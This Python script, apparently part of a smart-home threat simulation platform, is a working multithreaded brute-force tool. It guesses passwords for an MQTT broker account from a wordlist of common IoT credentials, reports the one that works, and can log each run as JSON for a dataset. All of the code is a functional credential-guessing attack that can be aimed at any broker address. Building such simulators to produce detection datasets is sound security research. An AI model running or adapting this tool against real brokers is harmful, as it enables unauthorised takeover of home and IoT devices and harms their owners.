import paho.mqtt.client as mqtt
import time
import argparse
import sys
import threading
import json
import os
from queue import Queue

# Configuration for logging
LOG_DIR = "/home/pirator/smart-home-threat-simulation-platform/dataset/logs"
os.makedirs(LOG_DIR, exist_ok=True)

def try_password(broker, port, username, password, results):
    """
    Attempts to connect to the MQTT broker with the given username and password.
    Updates the results dictionary with success/failure.
    """
    client = mqtt.Client()
    client.username_pw_set(username, password)
    
    # We use a short timeout for performance
    try:
        rc = client.connect(broker, port, 10)
        # rc 0 is success
        if rc == 0:
            results['success'] = True
            results['password'] = password
            print(f"[SUCCESS] Password found: {password}")
            client.disconnect()
            return True
    except Exception:
        pass
    
    # print(f"[{'FAILED':7}] {password}") # Too noisy for multithreading
    return False

def worker(broker, port, username, queue, results, stop_event):
    """
    Worker thread that pulls passwords from the queue and tries them.
    """
    while not queue.empty() and not stop_event.is_set():
        password = queue.get()
        if try_password(broker, port, username, password, results):
            stop_event.set()
        queue.task_done()
        # Small sleep between attempts per thread if needed to avoid being blocked
        # time.sleep(0.1)

def main():
    parser = argparse.ArgumentParser(description="Advanced MQTT Brute Force Attack Simulator (v2)")
    parser.add_argument("--broker", default="192.168.1.100", help="MQTT Broker IP")
    parser.add_argument("--port", type=int, default=1883, help="MQTT Broker Port")
    parser.add_argument("--username", default="admin", help="Username to target")
    parser.add_argument("--threads", type=int, default=5, help="Number of concurrent threads")
    parser.add_argument("--wordlist", nargs="*", default=["admin", "1234", "password", "test123", "iot123", "root", "123456", "admin123"],
                        help="List of passwords to try")
    parser.add_argument("--log", action="store_true", help="Enable logging to JSON for dataset")
    
    args = parser.parse_args()

    print(f"🚀 Starting Advanced Brute Force Attack on {args.broker}:{args.port}")
    print(f"👤 Target Username: {args.username}")
    print(f"🧶 Threads: {args.threads}")
    print("-" * 50)

    password_queue = Queue()
    for pwd in args.wordlist:
        password_queue.put(pwd)

    results = {'success': False, 'password': None}
    stop_event = threading.Event()
    threads = []

    start_time = time.time()

    for i in range(args.threads):
        t = threading.Thread(target=worker, args=(args.broker, args.port, args.username, password_queue, results, stop_event))
        t.start()
        threads.append(t)

    # Wait for all threads to finish or success
    for t in threads:
        t.join()

    end_time = time.time()
    duration = end_time - start_time

    print("-" * 50)
    if results['success']:
        print(f"✅ Attack Result: SUCCESS (Password: {results['password']})")
    else:
        print("❌ Attack Result: FAILED (Password not in list)")
    
    print(f"⏱️ Time Taken: {duration:.2f} seconds")

    if args.log:
        log_data = {
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "attack_type": "brute_force",
            "target": f"{args.broker}:{args.port}",
            "username": args.username,
            "success": results['success'],
            "duration_sec": duration,
            "threads": args.threads,
            "attempts": len(args.wordlist)
        }
        log_file = os.path.join(LOG_DIR, f"bruteforce_{int(time.time())}.json")
        with open(log_file, 'w') as f:
            json.dump(log_data, f, indent=4)
        print(f"📊 Results logged to: {log_file}")

if __name__ == "__main__":
    main()
